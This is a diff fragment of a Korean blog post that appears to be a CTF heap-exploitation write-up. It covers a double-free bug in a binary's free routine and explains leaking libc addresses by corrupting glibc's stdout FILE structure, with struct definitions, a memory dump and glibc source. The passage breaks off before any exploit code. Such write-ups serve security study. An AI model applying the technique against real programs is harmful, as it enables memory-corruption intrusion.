+    RELRO<span class="token punctuation">:</span>    Full RELRO
+    Stack<span class="token punctuation">:</span>    Canary found
+    NX<span class="token punctuation">:</span>       NX enabled
+    PIE<span class="token punctuation">:</span>      PIE enabled</code></pre></div>
+<h2 id="main-함수-분석" style="position:relative;"><a href="#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D" aria-label="main 함수 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>main 함수 분석</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 655px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+ElEQVQoz52R227DIBBE+f9frKJKvcRpXLAddmFvQIQtRWnlh7qjeVuOZod1U1QEpdxM255qa6Wubq2Walqk26RWc+8Df36I91R/q4Mo6Tv5K1xHGJPmyDDi6FMIKYCg8zONI4jY+vyYXOIyBTuf2+WiMRaz8jxm45nmhRY2XjvUhztMVpdZTqc8DLIsReQHLEVAABikyF6y9OQ1Vg+vHZPGm4hqZtpaM/Mf+/e1p1BfXuPbcIPIgKJqjzEphRQmmuY878BIBiDXL0loqv3DnmNLLVp08w58S+Y9xWiIRnSstoNsiDXGhliOntrFZO2/cll72nb4o/Adkhv/Zw+c6wcAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./0.png"
+        title="./0.png"
+        src="/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png"
+        srcset="/static/7d27dc209a6ccc4d097443af38f803ca/e9ff0/0.png 180w,
+/static/7d27dc209a6ccc4d097443af38f803ca/f21e7/0.png 360w,
+/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png 655w"
+        sizes="(max-width: 655px) 100vw, 655px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li><code class="language-text">print_menu</code> 함수를 바탕으로 1.alloc, 2. free, 3. exit 조건을 수행하는 것을 확인할 수 있다.</li>
+</ul>
+<h2 id="alloc" style="position:relative;"><a href="#alloc" aria-label="alloc permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>alloc</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 61.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABMElEQVQoz5WS627bMAyF/f6vuLbDMm9x4ljVhTRvIjW4CJYBG4aUPwQBR58Ob9OyFmiAuANgrU3VxtMxXbZ9nvOy8LrqumpKg2hEPAdf36lkTolai5xHKR0gmO9yj46KVWrlioogAArHRYGNp1sW2pW5p81aG0Qm0t3v1uYGCgcslYyaNBA4Tj1+mVA8bX7Z2lbziPGpmMi85LiupF3is/D67rU4SKvIpuN3wk/BP6/+8iXmM88/+HSyWvVPOSLMzcI83MP/dpacO+JA0G0Ts+H+GJV0ObfzAkvaU5GCgt37A657vL2O1xPM6fb2DUruramI9u7eh350O3NGRVRMlMwfWzQV9OXcl4u+fJXvt2sFJCIRZu5EHv/t4XRJhCBMQyU+avzHozjquAvubnY3/wWIE77JhKVD0AAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./1.png"
+        title="./1.png"
+        src="/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png"
+        srcset="/static/1065ae685e1e928c28f52c7e47c62a3f/e9ff0/1.png 180w,
+/static/1065ae685e1e928c28f52c7e47c62a3f/f21e7/1.png 360w,
+/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png 642w"
+        sizes="(max-width: 642px) 100vw, 642px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>메모리 동적할당 과정을 확인해 보면 전역 포인터 배열 <code class="language-text">heap_ptr</code> 에 할당하는 것을 확인할 수 있으며 인덱스 범위가 총19개까지 할당이 가능하다.</li>
+<li>사용자의 입력값이 <code class="language-text">0x78</code> 이하까지 size로 할당이 되어지며 해당 사이즈 만큼 데이터를 입력 할 수 있다.</li>
+</ul>
+<h2 id="free" style="position:relative;"><a href="#free" aria-label="free permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>free</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 620px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyUlEQVQY042Q3WrDMAyF8/5vsmda2dpmCWsSJ7ZsWfKfNNZ2sMEuLHQhOOdDhzNM64v10+EyscQkyBKoxlR6djj8ydk3iBUoJpaSNSftnGHZ63LT99GfP8K65Frab1lUTDSv5jS6ERKEjD4FzFFUvmEDDK5aHzcHgHH3zhPepSdMhRw7x44KQQLLFjM+4cBtnmRed2pYWsaCQEFaX+zPLV/OPF51vuF2eJF/TKLyePU45CfYYCAxF0QNHJGpNVGV3sIwNe23/4W/ALmu1IDhzGnNAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./2.png"
+        title="./2.png"
+        src="/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png"
+        srcset="/static/1869ca93d30719e9422c46ece04e30c4/e9ff0/2.png 180w,
+/static/1869ca93d30719e9422c46ece04e30c4/f21e7/2.png 360w,
+/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png 620w"
+        sizes="(max-width: 620px) 100vw, 620px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>free되는 과정을 확인해 보면 사용자의 입력 값이 곧 인덱스 범위로 사용되어 원하는 힙을 해제할 수 있으며 기본적인 길이 검증이 존재한다.</li>
+<li>하지만 해제한 초인터를 초기화하지 않기 때문에 Double Free Bug가 발생한다.</li>
+</ul>
+<h2 id="memory-leak-idea" style="position:relative;"><a href="#memory-leak-idea" aria-label="memory leak idea permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>memory leak Idea</h2>
+<ul>
+<li>어떻게 하면 메모리 주소값을 릭할 수 있을 까?</li>
+<li>힙 청크의 데이터를 출력하는 기능이 존재하지 않아 다른 방법을 찾아야 한다.</li>
+</ul>
+<h2 id="_io_file_stdout" style="position:relative;"><a href="#_io_file_stdout" aria-label="_io_file_stdout permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>_IO_FILE_stdout</h2>
+<ul>
+<li><code class="language-text">stdout</code> 파일 디스크립터는 출력할 때 주로 사용하며 구조체로 수많은 멤버 변수가 정의되어 있다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>		<span class="token comment">/* High-order word -> _IO_MAGIC, 나머지는 플래그 */</span>
+  <span class="token comment">/* 다음 포인터는 C++ streambuf 프로토콜에 해당한다. */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>	<span class="token comment">/* 파일 읽기 버퍼에 대한 포인터*/</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>	<span class="token comment">/* 파일 읽기 버퍼 주소의 끝을 가리키는 포인터*/</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of putback+get area.,
+ 파일 읽기 버퍼 주소의 시작을 가리키는 포인터 */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span>	<span class="token comment">/* 파일 쓰기 버퍼의 주소의 시작을 가리키는 포인터 */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>	<span class="token comment">/* 쓰기 버퍼에 대한 포인터 */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>	<span class="token comment">/* 파일 쓰기 버퍼 주소의 끝을 가리키는 포인터 */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of reserve area. 준비 구역의 시작 */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>	<span class="token comment">/* 준비 구역의 끝 */</span>
+  <span class="token comment">/* 다음 필드는 백업 및 실행 취소를 지원하는데 사용된다.*/</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment">/* Pointer to start of non-current get area. */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment">/* Pointer to first valid character of backup area */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment">/* Pointer to end of non-current get area. */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">_IO_marker</span> <span class="token operator">*</span>_markers<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_chain<span class="token punctuation">;</span> 
+  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>
+  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>
+  __off_t _old_offset<span class="token punctuation">;</span> <span class="token comment">/* This used to be _offset but it's too small.  */</span>
+  <span class="token comment">/* 1+column number of pbase(); 0 is unknown. */</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>
+  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span>_IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_USE_OLD_IO_FILE</span></span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></div>
+<h2 id="stdout" style="position:relative;"><a href="#stdout" aria-label="stdout permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>stdout</h2>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token number">0x7ffff7dd0760</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">></span><span class="token operator">:</span>       <span class="token number">0x00000000fbad2887</span>      <span class="token number">0x00007ffff7dd07e3</span>
+<span class="token number">0x7ffff7dd0770</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd07e3</span>      <span class="token number">0x00007ffff7dd07e3</span>
+<span class="token number">0x7ffff7dd0780</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd07e3</span>      <span class="token number">0x00007ffff7dd07e3</span>
+<span class="token number">0x7ffff7dd0790</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd07e3</span>      <span class="token number">0x00007ffff7dd07e3</span>
+<span class="token number">0x7ffff7dd07a0</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd07e4</span>      <span class="token number">0x0000000000000000</span>
+<span class="token number">0x7ffff7dd07b0</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span>
+<span class="token number">0x7ffff7dd07c0</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>      <span class="token number">0x00007ffff7dcfa00</span>
+<span class="token number">0x7ffff7dd07d0</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span><span class="token operator">:</span>   <span class="token number">0x0000000000000001</span>      <span class="token number">0xffffffffffffffff</span>
+<span class="token number">0x7ffff7dd07e0</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">128</span><span class="token operator">></span><span class="token operator">:</span>   <span class="token number">0x000000000a000000</span>      <span class="token number">0x00007ffff7dd18c0</span>
+<span class="token number">0x7ffff7dd07f0</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">144</span><span class="token operator">></span><span class="token operator">:</span>   <span class="token number">0xffffffffffffffff</span>      <span class="token number">0x0000000000000000</span>
+<span class="token number">0x7ffff7dd0800</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span><span class="token operator">:</span>   <span class="token number">0x00007ffff7dcf8c0</span>      <span class="token number">0x0000000000000000</span>
+<span class="token number">0x7ffff7dd0810</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">176</span><span class="token operator">></span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span>
+<span class="token number">0x7ffff7dd0820</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">192</span><span class="token operator">></span><span class="token operator">:</span>   <span class="token number">0x00000000ffffffff</span>      <span class="token number">0x0000000000000000</span>
+<span class="token number">0x7ffff7dd0830</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">208</span><span class="token operator">></span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>      <span class="token number">0x00007ffff7dcc2a0</span></code></pre></div>
+<ul>
+<li>printf, puts와 같은 stdout 파일 디스크립터를 사용하는 함수가 호출될 때 내부적으로 <code class="language-text">_IO_new_do_write</code> 함수가 호출된다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAnUlEQVQI1yXH2w6CIAAAUD8mLUEBL6ggd0Sk6YNtbW39/3+06u2cTAkb0y6XbZJWuijdOutF+c2EpHwUJnDlmPIm3IUNs/HCBukiUw51Q6bX9Hi99/MpfZzNQrkahJ6kHYUZhSGUQdID3KF+JJTV7VA1FPcTJD1saMa1345zSQflEuDuWpEC4hI1JWpzgL6t8K1ucoBygP64/FBA/AF8LSgA7QDQvgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./3.png"
+        title="./3.png"
+        src="/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png"
+        srcset="/static/ddb40862e7ea005b1c65709846244bc6/e9ff0/3.png 180w,
+/static/ddb40862e7ea005b1c65709846244bc6/f21e7/3.png 360w,
+/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png 720w,
+/static/ddb40862e7ea005b1c65709846244bc6/302a4/3.png 1080w,
+/static/ddb40862e7ea005b1c65709846244bc6/0f246/3.png 1118w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li><code class="language-text">puts</code> 함수를 호출할 때 <code class="language-text">_IO_new_file_xsputn</code> 함수를 호출하고 해당 함수에서 다음과 같이 <code class="language-text">new_do_write</code> 함수를 호출하게 된다.</li>
+</ul>
+<h2 id="_io_new_file_xsputn-함수" style="position:relative;"><a href="#_io_new_file_xsputn-%ED%95%A8%EC%88%98" aria-label="_io_new_file_xsputn 함수 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>_IO_new_file_xsputn 함수</h2>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp">_IO_size_t
+<span class="token function">_IO_new_file_xsputn</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>do_write<span class="token punctuation">)</span>
+	<span class="token punctuation">{</span>
+		count <span class="token operator">=</span> <span class="token function">new_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> s<span class="token punctuation">,</span> do_write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		to_do <span class="token operator">-=</span> count<span class="token punctuation">;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;</span> do_write<span class="token punctuation">)</span>
+		    <span class="token keyword">return</span> n <span class="token operator">-</span> to_do<span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span></code></pre></div>
+<ul>
+<li>new_do_write(f,s,do_write) 함수 호출</li>
+<li>fp, stdout 구조체</li>
+</ul>
+<h2 id="new_do_write-함수" style="position:relative;"><a href="#new_do_write-%ED%95%A8%EC%88%98" aria-label="new_do_write 함수 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>new_do_write 함수</h2>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_IS_APPENDING</span> <span class="token expression"><span class="token number">0x1000</span></span></span>
+
+<span class="token keyword">static</span> size_t <span class="token function">new_do_write</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> size_t to_do<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  size_t count<span class="token punctuation">;</span>
+  <span class="token comment">// 전달 받은 파일 포인터의 _flags 멤버 변수의 값이</span>
+	<span class="token comment">//  _IO_IS_APPENDING 비트를 포함하고 있는지 확인한다.</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_IS_APPENDING<span class="token punctuation">)</span>                              
+    fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>
+
+  <span class="token comment">// 전달 받은 파일 포인터의 _IO_read_end 포인터와</span>
+	<span class="token comment">// _IO_write_base 포인터가 다른지 확인한다.</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_end <span class="token operator">!=</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span>                  
+    <span class="token punctuation">{</span>
+      off64_t new_pos
+	<span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_write_base <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">==</span> _IO_pos_BAD<span class="token punctuation">)</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>_offset <span class="token operator">=</span> new_pos<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token comment">// 만약 line 8의 조건에서 값이 같다면</span>
+<span class="token comment">//  _IO_SYSWRITE 함수를 통해 new_do_write 함수의 인자인 data를 to_do의 크기만큼 출력한다.</span>
+  count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span>   
+                      
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_cur_column <span class="token operator">&amp;&amp;</span> count<span class="token punctuation">)</span>
+    fp<span class="token operator">-></span>_cur_column <span class="token operator">=</span> <span class="token function">_IO_adjust_column</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_cur_column <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> count<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token function">_IO_setg</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>
+  fp<span class="token operator">-></span>_IO_write_end <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span>
+		       <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF <span class="token operator">|</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		       <span class="token operator">?</span> fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">:</span> fp<span class="token operator">-></span>_IO_buf_end<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> count<span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre></div>
+<ul>
+<li>stdout→flags 에 <code class="language-text">_IO_IS_APPENDING</code> 이 포함되어 있어야 한다.</li>
+<li>_IO_new_do_write, _IO_SYSWRITE를 통해 _IO_write_base를 출력한다.</li>
+</ul>
+<div class="gatsby-highlight" data-language="cpp"><pre class="language-cpp"><code class="language-cpp">count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token operator">--</span><span class="token operator">></span>
